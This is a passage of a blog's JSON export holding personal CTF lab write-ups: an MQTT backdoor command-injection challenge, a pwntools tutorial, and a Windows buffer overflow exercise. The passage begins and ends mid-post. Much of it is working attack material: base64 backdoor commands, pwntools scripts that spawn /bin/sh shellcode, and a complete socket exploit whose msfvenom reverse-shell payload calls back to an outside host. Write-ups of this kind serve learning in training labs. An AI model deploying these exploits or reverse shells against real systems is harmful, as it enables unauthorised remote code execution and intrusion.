$SYS&#x2F;broker&#x2F;version: mosquitto version 2.0.14 | $SYS&#x2F;broker&#x2F;shared_subscriptions&#x2F;count: 0 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;dropped&#x2F;15min: 0.00 | $SYS&#x2F;broker&#x2F;load&#x2F;sockets&#x2F;1min: 3.22 | $SYS&#x2F;broker&#x2F;bytes&#x2F;sent: 3994 | $SYS&#x2F;broker&#x2F;clients&#x2F;inactive: 0 | $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;sent&#x2F;15min: 7.77 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;sent&#x2F;5min: 11.59 | $SYS&#x2F;broker&#x2F;load&#x2F;sockets&#x2F;15min: 0.26 | $SYS&#x2F;broker&#x2F;clients&#x2F;connected: 2 | $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;received&#x2F;5min: 540.82 | $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;sent&#x2F;5min: 22.75 | $SYS&#x2F;broker&#x2F;clients&#x2F;total: 2 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;received&#x2F;15min: 0.00 | $SYS&#x2F;broker&#x2F;uptime: 33 seconds | $SYS&#x2F;broker&#x2F;subscriptions&#x2F;count: 3 | $SYS&#x2F;broker&#x2F;publish&#x2F;bytes&#x2F;received: 1981 | $SYS&#x2F;broker&#x2F;messages&#x2F;sent: 142 | $SYS&#x2F;broker&#x2F;store&#x2F;messages&#x2F;bytes: 296 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;dropped&#x2F;1min: 0.00 | $SYS&#x2F;broker&#x2F;clients&#x2F;active: 2 | $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;received&#x2F;15min: 3.86 | $SYS&#x2F;broker&#x2F;store&#x2F;messages&#x2F;count: 52 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;sent&#x2F;15min: 3.91 | $SYS&#x2F;broker&#x2F;publish&#x2F;messages&#x2F;dropped: 0 | $SYS&#x2F;broker&#x2F;clients&#x2F;disconnected: 0 | $SYS&#x2F;broker&#x2F;publish&#x2F;bytes&#x2F;sent: 675 | $SYS&#x2F;broker&#x2F;publish&#x2F;messages&#x2F;received: 0 | $SYS&#x2F;broker&#x2F;publish&#x2F;messages&#x2F;sent: 84 | $SYS&#x2F;broker&#x2F;load&#x2F;sockets&#x2F;5min: 0.76 | livingroom&#x2F;speaker: &#123;&quot;id&quot;:4007409197343670969,&quot;gain&quot;:45&#125; | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;sent&#x2F;1min: 53.91 | $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;sent&#x2F;15min: 189.97 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;received&#x2F;5min: 0.00 | $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;received&#x2F;15min: 187.07 | $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;sent&#x2F;5min: 561.92 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;received&#x2F;1min: 0.00 | $SYS&#x2F;broker&#x2F;clients&#x2F;maximum: 2 | $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;dropped&#x2F;5min: 0.00 | $SYS&#x2F;broker&#x2F;bytes&#x2F;received: 2859 | $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;received&#x2F;1min: 45.29 | kitchen&#x2F;toaster: &#123;&quot;id&quot;:14194221257404514717,&quot;in_use&quot;:false,&quot;temperature&quot;:153.88422,&quot;toast_time&quot;:272&#125; | yR3gPp0r8Y&#x2F;AGlaMxmHJe&#x2F;qV66JF5qmH&#x2F;config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ&#x3D;&#x3D; | $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;sent&#x2F;1min: 99.20 | $SYS&#x2F;broker&#x2F;messages&#x2F;stored: 52 | $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;received&#x2F;5min: 11.17 | $SYS&#x2F;broker&#x2F;load&#x2F;connections&#x2F;5min: 0.58 | $SYS&#x2F;broker&#x2F;load&#x2F;connections&#x2F;1min: 2.46 | $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;sent&#x2F;1min: 2587.53 | $SYS&#x2F;broker&#x2F;retained messages&#x2F;count: 51 | $SYS&#x2F;broker&#x2F;clients&#x2F;expired: 0 | $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;received&#x2F;1min: 2188.79 | $SYS&#x2F;broker&#x2F;load&#x2F;connections&#x2F;15min: 0.20 |_ storage&#x2F;10.10.85.233thermostat: &#123;&quot;id&quot;:2291235996486415869,&quot;temperature&quot;:23.365356&#125; The port 1883 is open, the service is mosquito version 2.0.14.We can also see mqtt-subscribe. Documentationhttps://cs.pomona.edu/classes/po181u/docs/labs/lab4/ I have to install mosquito: sudo pacman -S mosquitto mosquitto_pub : for publishing to MQTT servers mosquitto_sub : for subscribing to MQTT servers -h : mqtt host to connnect to. Defaults to localhost -t : mqtt topic to publish/subscribe to -m : mqtt message body for publication -v : print published messages verbosely Get base64 stringI’m looking for all the datas with mosquitto_sub. mosquitto_sub -h 10.10.85.233 -t \"#\" echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== |base64 -d Output: &#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;registered_commands&quot;:[&quot;HELP&quot;,&quot;CMD&quot;,&quot;SYS&quot;],&quot;pub_topic&quot;:&quot;U4vyqNlQtf&#x2F;0vozmaZyLT&#x2F;15H9TF6CHg&#x2F;pub&quot;,&quot;sub_topic&quot;:&quot;XD2rfR9Bez&#x2F;GqMpRSEobh&#x2F;TvLQehMg0E&#x2F;sub&quot;&#125; The ID is : cdd1b1c0-1c40-4b0f-8e22-61b357548b7dregistered_commands: CMD should be usefull for us.pub_topic:U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pubsub_topic:XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub Now we can try to publish a command.we also need to let the subscriber listen. Send a commandSubscribermosquitto_sub -h 10.10.85.233 -t \"#\" Publishermosquitto_pub -h 10.10.85.233 -t \"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub\" -m \"eqrgijkosrgfuheqrguirgequi\" Decode itecho SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk= |base64 -d Output Invalid message format. Format: base64(&#123;&quot;id&quot;: &quot;&lt;backdoor id&gt;&quot;, &quot;cmd&quot;: &quot;&lt;command&gt;&quot;, &quot;arg&quot;: &quot;&lt;argument&gt;&quot;&#125;)% Use the backdoorWe need to encode it in base64. echo '&#123;\"id\": \"4879005204976514238\", \"cmd\": \"CMD\", \"arg\": \"cat *\"&#125;' |base64 Output: eyJpZCI6ICI0ODc5MDA1MjA0OTc2NTE0MjM4IiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImNhdCAq In0K This will be our message. mosquitto_pub -h 10.10.85.233 -t \"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub\" -m \"eyJpZCI6ICI0ODc5MDA1MjA0OTc2NTE0MjM4IiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImNhdCAqIn0K\" FLagecho eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9 |base64 -d Output: &#123;\"id\":\"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\",\"response\":\"flag&#123;18d44fc0707ac8dc8be45bb83db54013&#125;\\n\"&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Intro To Pwntools","slug":"Intro To Pwntools","date":"2023-03-01T06:40:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/Intro To Pwntools.html","link":"","permalink":"https://peanutstick.github.io/post/Intro%20To%20Pwntools.html","excerpt":"","text":"https://tryhackme.com/room/introtopwntools So I’m connected with ssh on the box: Checksec Does Intro2pwn1 have FULL RELRO Full RELRO makes the entire GOT read-only which removes the ability to perform a “GOT overwrite” attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run. So it’s more secure and eliminate the risk of buffer overflows.https://ctf101.org/binary-exploitation/relocation-read-only/ checksec intro2pwn1 YES Does Intro2pwn1 have RWX segments RWX: Tells us, if the binary has segments We don’t see it in the output of checksec. NO Does Intro2pwn2 have a stack canary Stack canaries are tokens placed after a stack to detect a stack overflow.This allows the program to detect a buffer overflow and shut down. NO Does Intro2pwn2 not have PIE PIE stands for Position Independent Executable.This loads the program dependencies into random locations Exemple without PIE:He create a shared library $ cc -fpic -shared -I. -nostdlib -nodefaultlibs -o libnotc.so os/syscall.x86_64.s os/syscall.c not/strlen.c not/puts.c Then recompile it $ cc -nostdlib -nodefaultlibs -I. -o dynamic-example os/start.x86_64.s main.c -L. -lnotc Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected? A stack buffer overflow can be caused deliberately as part of an attack known as stack smashing. it’s mean you can use it to gain acess on a machine Now cause a buffer overflow on intro2pwn2. What error do you get? so, if there is no stack smashing, can i use it to gain acess on the mavhine ? cyclicIn this chapter we learn to do a bufferoverflow when the canary protection is missing.you can see that with checksec. We alsolern how to convert from hex to ascii, and acsii to hex. With gdb you can locate the function print_flag() like this. info function Or like this: print&amp; print_flag Then in a python script we have to change the value of eip: from pwn import * padding = cyclic(100) padding = cyclic(cyclic_find('jaaa')) #eip = p32(0xdeadbeef) eip = p32(0x8048536) payload = padding + eip print(payload) The output of payload should be printed in a file to be used later: python pwn_cyclic.py > attack in this file it’s looking like this:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6 NetworkingDear buzz, I&#39;m running a service on port 1337, which has an overflow vulnerability. I&#39;ve left you a version that will run on port 1336 so that you can develop your exploit. Sincerely, dizmas So we have a copy of the service on the port 1336 of the service on the port 1337.In this exemple we don’t have to change the payload or add nops, it’s just to show how to use the network. from pwn import * connect = remote('127.0.0.1', 1337) print(connect.recvn(18)) payload = \"A\"*32 payload += p32(0xdeadbeef) connect.send(payload) print(connect.recvn(34)) ShellcraftFor this challenge we nee d to disable ASLR (address space layout randomization).This randomise where in memory the executable is loaded, so if we found the location of a function, the next time we run it the function will be somewhere else. echo 0 | sudo tee /proc/sys/kernel/randomize_va_space ok, we don’t have the right to do it.use the script instead. sudo ./disable_aslr.sh Let’s find the EIP, I’m creating a string with cyclic 100, then I open the program with gdb an past the string.The EIP is at taaa So I have to print 77*”A” and rest for the EIP.Now we gonna use a python script: from pwn import * padding = cyclic(cyclic_find('taaa')) eip = p32(0xffffd480+200) nop_slide = \"\\x90\"*1000 shellcode = \"\\xcc\" payload = padding + eip + nop_slide + shellcode print(payload) I put the output in the file payload: Now let’s create the shellcode wih shellcraft. shellcraft i386.linux.execve \"/bin///sh\" \"['sh', '-p']\" -f a from pwn import * proc = process('./intro2pwnFinal') padding = cyclic(cyclic_find('taaa')) eip = p32(0xffffd510+200) nop_slide = \"\\x90\"*1000 shellcode = \"jhh\\x2f\\x2f\\x2fsh\\x2fbin\\x89\\xe3jph\\x01\\x01\\x01\\x01\\x814\\x24ri\\x01,1\\xc9Qj\\x07Y\\x01\\xe1Qj\\x08Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80\" #shellcode = \"\\xcc\" payload = padding + eip + nop_slide + shellcode proc.send(payload) proc.interactive() My EIP was wrong, didn’t say the value 0xffffd510 in gdb.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Buffer overflow","slug":"Buffer-overflow","permalink":"https://peanutstick.github.io/tags/Buffer-overflow/"}]},{"title":"Buffer Overflow Prep 2","slug":"Buffer Overflow Prep 2","date":"2023-02-26T23:10:00.000Z","updated":"2023-04-12T14:14:27.244Z","comments":true,"path":"/post/Buffer Overflow Prep 2.html","link":"","permalink":"https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%202.html","excerpt":"","text":"It’s the same thing as the prep 1, but I still writing it because it’s my notes. Crashing at 630, it’s useless to be presice like this.If you enter only “A” chars you won’t see the offset in the EIP, he need a patern.https://wiremask.eu/tools/buffer-overflow-pattern-generator/ So it’s crashing between 600 and 700, let’s create a string of 300”A” + 400”patern”. 0x6c41316c offset 334 Offset 334, that’s mean 300”A” + 334”patern”.So now I can do 300+334=634, “A”334 + “B”4 View &gt; log (alt +l)!mona findmsp -distance 600 42424242 is my BBBB. So I found the EIP Finding Bad CharactersFor mona: !mona bytearray -b \"\\x00\" For me: \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff Restart the program then: nc 10.10.35.232 1337 &lt;&lt;&lt; \"OVERFLOW2 \"$(python -c 'print( \"A\"*634 + \"B\"*4 + \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")') !mona compare -f C:\\mona\\oscp\\bytearray.bin -a esp I got it, it’s because i’m using bash and not python so maybe there is problem of encoding. import socket ip = \"10.10.35.232\" port = 1337 prefix = \"OVERFLOW2 \" offset = 634 overflow = \"A\" * offset retn = \"BBBB\" padding = \"\" payload = \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") BadChars: \\x00\\x23\\x3c\\x83\\xba !mona bytearray -b \"\\x00\\x23\\x3c\\x83\\xba\" I modify my payload to remove the BadChars. Find the jump point!mona jmp -r esp -cpb \"\\x00\\x23\\x3c\\x83\\xba\" So 625011af = \\xaf\\x11\\x50\\x62It will be our jmp. we need to place it into the EIP, so instead the BBBB prefix = \"OVERFLOW2 \" offset = 634 overflow = \"A\" * offset retn = \"\\xaf\\x11\\x50\\x62\" padding = \"\\x90\" * 16 Gereate the payloadmsfvenom -p windows/shell_reverse_tcp LHOST=10.8.50.167 LPORT=4848 EXITFUNC=thread -b \"\\x00\\x23\\x3c\\x83\\xba\" -f c Output: \"\\xfc\\xbb\\xcf\\x2d\\xa4\\x5e\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\" \"\\xc3\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x33\\xc5\\x26\" \"\\x5e\\xcb\\x16\\x47\\xd6\\x2e\\x27\\x47\\x8c\\x3b\\x18\\x77\\xc6\\x69\" \"\\x95\\xfc\\x8a\\x99\\x2e\\x70\\x03\\xae\\x87\\x3f\\x75\\x81\\x18\\x13\" \"\\x45\\x80\\x9a\\x6e\\x9a\\x62\\xa2\\xa0\\xef\\x63\\xe3\\xdd\\x02\\x31\" \"\\xbc\\xaa\\xb1\\xa5\\xc9\\xe7\\x09\\x4e\\x81\\xe6\\x09\\xb3\\x52\\x08\" \"\\x3b\\x62\\xe8\\x53\\x9b\\x85\\x3d\\xe8\\x92\\x9d\\x22\\xd5\\x6d\\x16\" \"\\x90\\xa1\\x6f\\xfe\\xe8\\x4a\\xc3\\x3f\\xc5\\xb8\\x1d\\x78\\xe2\\x22\" \"\\x68\\x70\\x10\\xde\\x6b\\x47\\x6a\\x04\\xf9\\x53\\xcc\\xcf\\x59\\xbf\" \"\\xec\\x1c\\x3f\\x34\\xe2\\xe9\\x4b\\x12\\xe7\\xec\\x98\\x29\\x13\\x64\" \"\\x1f\\xfd\\x95\\x3e\\x04\\xd9\\xfe\\xe5\\x25\\x78\\x5b\\x4b\\x59\\x9a\" \"\\x04\\x34\\xff\\xd1\\xa9\\x21\\x72\\xb8\\xa5\\x86\\xbf\\x42\\x36\\x81\" \"\\xc8\\x31\\x04\\x0e\\x63\\xdd\\x24\\xc7\\xad\\x1a\\x4a\\xf2\\x0a\\xb4\" \"\\xb5\\xfd\\x6a\\x9d\\x71\\xa9\\x3a\\xb5\\x50\\xd2\\xd0\\x45\\x5c\\x07\" \"\\x76\\x15\\xf2\\xf8\\x37\\xc5\\xb2\\xa8\\xdf\\x0f\\x3d\\x96\\xc0\\x30\" \"\\x97\\xbf\\x6b\\xcb\\x70\\xca\\x63\\xe1\\x27\\xa2\\x71\\x05\\x3a\\xc3\" \"\\xff\\xe3\\x50\\x33\\x56\\xbc\\xcc\\xaa\\xf3\\x36\\x6c\\x32\\x2e\\x33\" \"\\xae\\xb8\\xdd\\xc4\\x61\\x49\\xab\\xd6\\x16\\xb9\\xe6\\x84\\xb1\\xc6\" \"\\xdc\\xa0\\x5e\\x54\\xbb\\x30\\x28\\x45\\x14\\x67\\x7d\\xbb\\x6d\\xed\" \"\\x93\\xe2\\xc7\\x13\\x6e\\x72\\x2f\\x97\\xb5\\x47\\xae\\x16\\x3b\\xf3\" \"\\x94\\x08\\x85\\xfc\\x90\\x7c\\x59\\xab\\x4e\\x2a\\x1f\\x05\\x21\\x84\" \"\\xc9\\xfa\\xeb\\x40\\x8f\\x30\\x2c\\x16\\x90\\x1c\\xda\\xf6\\x21\\xc9\" \"\\x9b\\x09\\x8d\\x9d\\x2b\\x72\\xf3\\x3d\\xd3\\xa9\\xb7\\x5e\\x36\\x7b\" \"\\xc2\\xf6\\xef\\xee\\x6f\\x9b\\x0f\\xc5\\xac\\xa2\\x93\\xef\\x4c\\x51\" \"\\x8b\\x9a\\x49\\x1d\\x0b\\x77\\x20\\x0e\\xfe\\x77\\x97\\x2f\\x2b\\x77\" \"\\x17\\xd0\\xd4\"; exploitimport socket ip = \"10.10.35.232\" port = 1337 prefix = \"OVERFLOW2 \" offset = 634 overflow = \"A\" * offset retn = \"\\xaf\\x11\\x50\\x62\" padding = \"\\x90\" * 16 payload=(\"\\xfc\\xbb\\xcf\\x2d\\xa4\\x5e\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\" \"\\xc3\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x33\\xc5\\x26\" \"\\x5e\\xcb\\x16\\x47\\xd6\\x2e\\x27\\x47\\x8c\\x3b\\x18\\x77\\xc6\\x69\" \"\\x95\\xfc\\x8a\\x99\\x2e\\x70\\x03\\xae\\x87\\x3f\\x75\\x81\\x18\\x13\" \"\\x45\\x80\\x9a\\x6e\\x9a\\x62\\xa2\\xa0\\xef\\x63\\xe3\\xdd\\x02\\x31\" \"\\xbc\\xaa\\xb1\\xa5\\xc9\\xe7\\x09\\x4e\\x81\\xe6\\x09\\xb3\\x52\\x08\" \"\\x3b\\x62\\xe8\\x53\\x9b\\x85\\x3d\\xe8\\x92\\x9d\\x22\\xd5\\x6d\\x16\" \"\\x90\\xa1\\x6f\\xfe\\xe8\\x4a\\xc3\\x3f\\xc5\\xb8\\x1d\\x78\\xe2\\x22\" \"\\x68\\x70\\x10\\xde\\x6b\\x47\\x6a\\x04\\xf9\\x53\\xcc\\xcf\\x59\\xbf\" \"\\xec\\x1c\\x3f\\x34\\xe2\\xe9\\x4b\\x12\\xe7\\xec\\x98\\x29\\x13\\x64\" \"\\x1f\\xfd\\x95\\x3e\\x04\\xd9\\xfe\\xe5\\x25\\x78\\x5b\\x4b\\x59\\x9a\" \"\\x04\\x34\\xff\\xd1\\xa9\\x21\\x72\\xb8\\xa5\\x86\\xbf\\x42\\x36\\x81\" \"\\xc8\\x31\\x04\\x0e\\x63\\xdd\\x24\\xc7\\xad\\x1a\\x4a\\xf2\\x0a\\xb4\" \"\\xb5\\xfd\\x6a\\x9d\\x71\\xa9\\x3a\\xb5\\x50\\xd2\\xd0\\x45\\x5c\\x07\" \"\\x76\\x15\\xf2\\xf8\\x37\\xc5\\xb2\\xa8\\xdf\\x0f\\x3d\\x96\\xc0\\x30\" \"\\x97\\xbf\\x6b\\xcb\\x70\\xca\\x63\\xe1\\x27\\xa2\\x71\\x05\\x3a\\xc3\" \"\\xff\\xe3\\x50\\x33\\x56\\xbc\\xcc\\xaa\\xf3\\x36\\x6c\\x32\\x2e\\x33\" \"\\xae\\xb8\\xdd\\xc4\\x61\\x49\\xab\\xd6\\x16\\xb9\\xe6\\x84\\xb1\\xc6\" \"\\xdc\\xa0\\x5e\\x54\\xbb\\x30\\x28\\x45\\x14\\x67\\x7d\\xbb\\x6d\\xed\" \"\\x93\\xe2\\xc7\\x13\\x6e\\x72\\x2f\\x97\\xb5\\x47\\xae\\x16\\x3b\\xf3\" \"\\x94\\x08\\x85\\xfc\\x90\\x7c\\x59\\xab\\x4e\\x2a\\x1f\\x05\\x21\\x84\" \"\\xc9\\xfa\\xeb\\x40\\x8f\\x30\\x2c\\x16\\x90\\x1c\\xda\\xf6\\x21\\xc9\" \"\\x9b\\x09\\x8d\\x9d\\x2b\\x72\\xf3\\x3d\\xd3\\xa9\\xb7\\x5e\\x36\\x7b\" \"\\xc2\\xf6\\xef\\xee\\x6f\\x9b\\x0f\\xc5\\xac\\xa2\\x93\\xef\\x4c\\x51\" \"\\x8b\\x9a\\x49\\x1d\\x0b\\x77\\x20\\x0e\\xfe\\x77\\x97\\x2f\\x2b\\x77\" \"\\x17\\xd0\\xd4\") postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Indeed, it’s better when I use rhe right tools. Conclusion Find where it’s craching (aproximatively) remove 200 chars, add 300 